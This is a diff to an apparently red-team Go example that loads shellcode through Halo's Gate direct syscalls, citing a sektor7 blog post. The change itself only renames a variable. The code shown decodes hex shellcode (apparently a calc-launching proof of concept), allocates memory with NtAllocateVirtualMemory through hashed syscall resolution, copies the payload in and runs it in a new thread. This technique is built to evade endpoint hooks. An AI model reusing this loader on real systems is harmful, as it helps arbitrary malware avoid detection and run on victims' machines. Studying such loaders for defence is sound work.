@@ -19,7 +19,7 @@ https://blog.sektor7.net/#!res/2021/halosgate.md
 */
 func main() {
 
-	shellcode, _ := hex.DecodeString("31c0506863616c635459504092741551648b722f8b760c8b760cad8b308b7e18b250eb1ab2604829d465488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd7")
+	sc, _ := hex.DecodeString("31c0506863616c635459504092741551648b722f8b760c8b760cad8b308b7e18b250eb1ab2604829d465488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd7")
 	var thisThread = uintptr(0xffffffffffffffff)
 	//从内存加载，得到sysid
 	alloc, e := gabh.MemHgate(str2sha1("NtAllocateVirtualMemory"), str2sha1)
@@ -39,10 +39,10 @@ func main() {
 	if e != nil {
 		panic(e)
 	}
-	createThread(shellcode, thisThread, alloc, protect, createthread, pWaitForSingleObject)
+	createThread(sc, thisThread, alloc, protect, createthread, pWaitForSingleObject)
 }
 
-func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {
+func createThread(sc []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {
 
 	const (
 		memCommit  = uintptr(0x00001000)
@@ -50,7 +50,7 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 	)
 
 	var baseA uintptr
-	regionsize := uintptr(len(shellcode))
+	regionsize := uintptr(len(sc))
 	r1, r := gabh.HgSyscall(
 		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
 		handle,
@@ -65,7 +65,7 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		return
 	}
 	//copy shellcode
-	memcpy(baseA, shellcode)
+	memcpy(baseA, sc)
 
 	var oldprotect uintptr
 	r1, r = gabh.HgSyscall(
